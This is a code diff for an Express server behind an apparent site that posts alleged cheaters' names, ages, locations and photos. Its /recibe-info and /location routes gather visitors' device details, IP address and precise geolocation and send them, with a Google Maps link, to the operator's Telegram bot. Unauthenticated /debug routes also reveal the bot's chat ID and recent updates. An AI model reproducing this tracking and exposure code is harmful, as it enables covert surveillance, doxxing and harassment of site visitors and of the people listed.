@@ -29,65 +29,87 @@ const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
 app.use(express.static(path.join(__dirname, "public")));
 
-// Al acceder a /, devuelve index.html
 app.get("/", (req, res) => {
     res.sendFile(path.join(__dirname, "public", "index.html"));
 });
 
 // =======================
-// FUNCIÓN PARA ENVIAR A TELEGRAM (MEJORADA)
+// FUNCIÓN PARA ENVIAR A TELEGRAM
 // =======================
 async function sendToTelegram(msg) {
     try {
-        // Verificar que las variables de entorno existan
-        const botToken = process.env.TELEGRAM_BOT_TOKEN;
-        const chatId = process.env.TELEGRAM_CHAT_ID;
+        const botToken = process.env.TELEGRAM_BOT_TOKEN?.trim();
+        const chatId = process.env.TELEGRAM_CHAT_ID?.trim();
+        
+        console.log("🔍 Configuración Telegram:");
+        console.log("- Bot Token:", botToken ? `${botToken.substring(0, 10)}...` : "No configurado");
+        console.log("- Chat ID:", chatId);
         
         if (!botToken || !chatId) {
-            console.error("❌ FALTAN VARIABLES DE ENTORNO PARA TELEGRAM");
-            console.error("TELEGRAM_BOT_TOKEN:", botToken ? "✓ Configurado" : "✗ No configurado");
-            console.error("TELEGRAM_CHAT_ID:", chatId ? "✓ Configurado" : "✗ No configurado");
+            console.error("❌ Faltan variables de entorno");
             return false;
         }
-
+        
+        // Convertir chatId a número
+        const chatIdNum = Number(chatId);
+        if (isNaN(chatIdNum)) {
+            console.error("❌ Chat ID inválido, debe ser número");
+            return false;
+        }
+        
+        console.log(`📤 Enviando a Chat ID: ${chatIdNum} ${chatIdNum < 0 ? '(Grupo)' : '(Chat privado)'}`);
+        
         const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
         const data = {
-            chat_id: chatId,
+            chat_id: chatIdNum,
             text: msg,
             parse_mode: "HTML"
         };
-
-        console.log("📤 Intentando enviar a Telegram...");
-        console.log("URL:", url.replace(botToken, "TOKEN_OCULTO"));
-        console.log("Chat ID:", chatId);
-
+        
         const response = await fetch(url, {
             method: "POST",
-            headers: { 
-                'Content-Type': 'application/json',
-                'User-Agent': 'Mozilla/5.0'
-            },
-            body: JSON.stringify(data)
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data),
+            timeout: 10000
         });
-
+        
         const result = await response.json();
-        console.log("Respuesta de Telegram:", result);
-
+        console.log("📥 Respuesta Telegram:", result);
+        
         if (result.ok) {
-            console.log("✅ Mensaje enviado a Telegram correctamente");
+            console.log("✅ Mensaje enviado exitosamente");
             return true;
         } else {
-            console.error("❌ Error de Telegram API:", result.description || result);
+            console.error("❌ Error de Telegram:", result.description);
+            
+            // Errores específicos y soluciones
+            switch (result.error_code) {
+                case 400:
+                    if (result.description.includes("chat not found")) {
+                        console.error("💡 SOLUCIÓN: Chat no encontrado. Verifica:");
+                        console.error("1. El bot debe estar añadido al grupo (para grupos)");
+                        console.error("2. Debes haber enviado /start al bot (para chats privados)");
+                        console.error("3. El bot debe tener Group Privacy desactivado para grupos");
+                    }
+                    break;
+                case 403:
+                    console.error("💡 SOLUCIÓN: Bot bloqueado o sin permisos");
+                    console.error("1. Desbloquea el bot en el chat");
+                    console.error("2. Asegúrate que el bot tenga permisos de admin en el grupo");
+                    break;
+                default:
+                    console.error("💡 Revisa la configuración del bot");
+            }
             return false;
         }
     } catch (error) {
-        console.error("❌ Error al enviar a Telegram:", error.message);
+        console.error("❌ Error general:", error.message);
         return false;
     }
 }
 
 // =======================
-// GET – Lista de infieles con comentarios y votos
+// RUTAS PRINCIPALES
 // =======================
 app.get("/infieles", async (req, res) => {
     try {
@@ -110,9 +132,6 @@ app.get("/infieles", async (req, res) => {
     }
 });
 
-// =======================
-// POST – Crear publicación
-// =======================
 app.post("/nuevo", upload.array("fotos", 10), async (req, res) => {
     try {
         const { reportero, nombre, apellido, edad, ubicacion, historia } = req.body;
@@ -129,9 +148,6 @@ app.post("/nuevo", upload.array("fotos", 10), async (req, res) => {
     }
 });
 
-// =======================
-// POST – Votar
-// =======================
 app.post("/votar", async (req, res) => {
     try {
         const { infiel_id, usuario, voto } = req.body;
@@ -152,9 +168,6 @@ app.post("/votar", async (req, res) => {
     }
 });
 
-// =======================
-// POST – Agregar comentario
-// =======================
 app.post("/comentario", upload.array("fotos", 5), async (req, res) => {
     try {
         const { infiel_id, nombre, texto, propietario } = req.body;
@@ -172,10 +185,8 @@ app.post("/comentario", upload.array("fotos", 5), async (req, res) => {
 });
 
 // =======================
-// MIGRACIÓN DE TU SISTEMA PHP ANTIGUO
+// TRACKING
 // =======================
-
-// Función para obtener IP real
 function getClientIp(req) {
     const keys = [
         'x-client-ip',
@@ -203,10 +214,8 @@ function getClientIp(req) {
     return req.socket.remoteAddress || 'Unknown';
 }
 
-// Temporal para datos del dispositivo
 let visitaTemporal = null;
 
-// Ruta /recibe-info
 app.post("/recibe-info", (req, res) => {
     try {
         const { agent = '', navegador = '', versionapp = '', dystro = '', idioma = '', bateri = 'N/A' } = req.body;
@@ -268,7 +277,6 @@ app.post("/recibe-info", (req, res) => {
     }
 });
 
-// Ruta /location (MEJORADA)
 app.post("/location", async (req, res) => {
     try {
         const { latitude, longitude, accuracy } = req.body;
@@ -276,18 +284,18 @@ app.post("/location", async (req, res) => {
         const ua = req.headers['user-agent'] || 'Unknown';
         const ts = new Date().toISOString();
 
-        let msg = "📍 <b>Nueva ubicación</b>\n";
+        let msg = "📍 <b>NUEVA UBICACIÓN RECIBIDA</b>\n";
         msg += `🌐 IP: ${ip}\n`;
-        if (latitude) msg += `📌 Lat: ${latitude}\n`;
-        if (longitude) msg += `📌 Lon: ${longitude}\n`;
+        if (latitude) msg += `📌 Latitud: ${latitude}\n`;
+        if (longitude) msg += `📌 Longitud: ${longitude}\n`;
         if (accuracy) msg += `🎯 Precisión: ${accuracy}m\n`;
-        msg += `🖥️ User-Agent: ${ua.substring(0, 100)}...\n\n`;
+        msg += `🖥️ User-Agent: ${ua.substring(0, 80)}...\n\n`;
 
-        msg += "<b>- Información del dispositivo -</b>\n";
+        msg += "<b>Información del dispositivo:</b>\n";
         if (visitaTemporal) {
             msg += visitaTemporal + "\n";
         } else {
-            msg += "Sin datos del dispositivo\n";
+            msg += "Sin datos adicionales\n";
         }
 
         msg += `\n⏰ Hora: ${ts}`;
@@ -295,81 +303,141 @@ app.post("/location", async (req, res) => {
             msg += `\n🌍 Google Maps: https://www.google.com/maps?q=${latitude},${longitude}`;
         }
 
-        console.log("📝 Mensaje preparado para Telegram:");
-        console.log(msg);
-
-        // Enviar a Telegram
+        console.log("📍 Enviando ubicación a Telegram...");
         const telegramEnviado = await sendToTelegram(msg);
-
-        // Limpiar temporal
+        
         visitaTemporal = null;
 
         res.json({ 
             status: 'logged', 
             timestamp: ts,
             telegram_sent: telegramEnviado,
-            message: telegramEnviado ? "Mensaje enviado a Telegram" : "Error al enviar a Telegram"
+            message: telegramEnviado ? "✅ Ubicación enviada" : "❌ Error al enviar"
         });
     } catch (err) {
         console.error("Error en /location:", err);
         res.status(500).json({ 
-            error: "Error interno del servidor",
+            error: "Error interno",
             details: err.message 
         });
     }
 });
 
 // =======================
-// RUTAS DE DEBUG PARA RENDER
+// RUTAS DE DIAGNÓSTICO
 // =======================
-
-// Verificar variables de entorno (seguro)
-app.get("/debug/env", (req, res) => {
+app.get("/debug", (req, res) => {
     const botToken = process.env.TELEGRAM_BOT_TOKEN;
     const chatId = process.env.TELEGRAM_CHAT_ID;
     
     res.json({
-        has_bot_token: !!botToken,
-        has_chat_id: !!chatId,
-        bot_token_length: botToken?.length || 0,
-        chat_id_length: chatId?.length || 0,
-        bot_token_preview: botToken ? `${botToken.substring(0, 10)}...` : "No configurado",
-        chat_id_preview: chatId ? `${chatId.substring(0, 5)}...` : "No configurado",
-        node_version: process.version
+        telegram: {
+            bot_token_exists: !!botToken,
+            chat_id_exists: !!chatId,
+            chat_id_value: chatId,
+            chat_id_type: chatId ? (chatId.startsWith('-') ? 'Grupo' : 'Chat privado') : 'No configurado',
+            chat_id_numeric: Number(chatId) || 'Inválido'
+        },
+        server: {
+            node: process.version,
+            environment: process.env.NODE_ENV || 'development',
+            uptime: process.uptime()
+        }
     });
 });
 
-// Probar envío a Telegram
-app.get("/debug/test-telegram", async (req, res) => {
+app.get("/debug/telegram-test", async (req, res) => {
     try {
-        console.log("🔧 Iniciando prueba de Telegram...");
+        const testMsg = `🤖 <b>PRUEBA DE CONEXIÓN</b>\n\n` +
+                       `✅ Bot activo: SrLeviBot\n` +
+                       `🕐 Hora: ${new Date().toLocaleString()}\n` +
+                       `💬 Chat ID: ${process.env.TELEGRAM_CHAT_ID}\n` +
+                       `📱 Servidor: ${req.headers.host}`;
         
-        const testMsg = `🔄 <b>Prueba de conexión desde Render</b>\n⏰ Hora: ${new Date().toISOString()}\n✅ Si ves esto, el bot funciona correctamente`;
-        
-        const result = await sendToTelegram(testMsg);
+        console.log("🔧 Probando conexión Telegram...");
+        const success = await sendToTelegram(testMsg);
         
         res.json({
-            success: result,
-            message: result ? "✅ Mensaje enviado a Telegram correctamente" : "❌ Error al enviar a Telegram",
+            success: success,
+            test_sent: true,
             timestamp: new Date().toISOString()
         });
     } catch (error) {
-        console.error("Error en test-telegram:", error);
-        res.status(500).json({ 
-            error: error.message,
-            success: false 
-        });
+        console.error("Error en test:", error);
+        res.status(500).json({ error: error.message });
     }
 });
 
-// Ruta de salud para Render
+app.get("/debug/check-bot", async (req, res) => {
+    try {
+        const botToken = process.env.TELEGRAM_BOT_TOKEN;
+        if (!botToken) {
+            return res.json({ error: "No token configurado" });
+        }
+        
+        const url = `https://api.telegram.org/bot${botToken}/getMe`;
+        const response = await fetch(url);
+        const result = await response.json();
+        
+        res.json({
+            bot_active: result.ok,
+            bot_info: result.result,
+            group_permissions: {
+                can_join_groups: result.result?.can_join_groups,
+                can_read_all_group_messages: result.result?.can_read_all_group_messages,
+                issue: result.result?.can_join_groups === false ? 
+                    "❌ Bot NO puede unirse a grupos. Ve a @BotFather → Bot Settings → Group Privacy → Turn off" :
+                    "✅ Bot puede unirse a grupos"
+            }
+        });
+    } catch (error) {
+        res.status(500).json({ error: error.message });
+    }
+});
+
+// Ruta para obtener mensajes recientes del bot
+app.get("/debug/bot-updates", async (req, res) => {
+    try {
+        const botToken = process.env.TELEGRAM_BOT_TOKEN;
+        if (!botToken) {
+            return res.json({ error: "No token configurado" });
+        }
+        
+        const url = `https://api.telegram.org/bot${botToken}/getUpdates`;
+        const response = await fetch(url);
+        const result = await response.json();
+        
+        // Extraer Chat IDs únicos
+        const chatIds = [];
+        if (result.result) {
+            result.result.forEach(update => {
+                if (update.message) {
+                    const chat = update.message.chat;
+                    chatIds.push({
+                        id: chat.id,
+                        type: chat.id < 0 ? 'Grupo' : 'Privado',
+                        title: chat.title || chat.username || chat.first_name || `Chat ${chat.id}`
+                    });
+                }
+            });
+        }
+        
+        res.json({
+            success: result.ok,
+            total_updates: result.result?.length || 0,
+            available_chat_ids: [...new Map(chatIds.map(item => [item.id, item])).values()],
+            updates_sample: result.result?.slice(0, 3)
+        });
+    } catch (error) {
+        res.status(500).json({ error: error.message });
+    }
+});
+
 app.get("/health", (req, res) => {
     res.json({
         status: "ok",
         timestamp: new Date().toISOString(),
-        service: "Infieles API",
-        environment: process.env.NODE_ENV || "development",
-        node_version: process.version
+        service: "Infieles API"
     });
 });
 
@@ -379,10 +447,25 @@ app.get("/health", (req, res) => {
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
     console.log("=======================================");
-    console.log("🚀 API lista en puerto", PORT);
+    console.log("🚀 API Infieles iniciada");
+    console.log("📍 Puerto:", PORT);
     console.log("🌐 Entorno:", process.env.NODE_ENV || "development");
-    console.log("📦 Node.js:", process.version);
-    console.log("🤖 Telegram Bot Token:", process.env.TELEGRAM_BOT_TOKEN ? "✓ Configurado" : "✗ No configurado");
-    console.log("💬 Telegram Chat ID:", process.env.TELEGRAM_CHAT_ID ? "✓ Configurado" : "✗ No configurado");
     console.log("=======================================");
+    
+    // Mostrar config Telegram
+    const chatId = process.env.TELEGRAM_CHAT_ID;
+    console.log("\n🤖 CONFIGURACIÓN TELEGRAM:");
+    console.log("- Chat ID:", chatId || "No configurado");
+    if (chatId) {
+        console.log("- Tipo:", chatId.startsWith('-') ? "Grupo" : "Chat privado");
+        console.log("- Numérico:", Number(chatId) || "Inválido");
+    }
+    
+    console.log("\n🔍 RUTAS DE DIAGNÓSTICO:");
+    console.log("- GET  /debug - Configuración actual");
+    console.log("- GET  /debug/telegram-test - Probar Telegram");
+    console.log("- GET  /debug/check-bot - Estado del bot");
+    console.log("- GET  /debug/bot-updates - Ver chats disponibles");
+    console.log("- POST /location - Enviar ubicación (tracking)");
+    console.log("=======================================\n");
 });
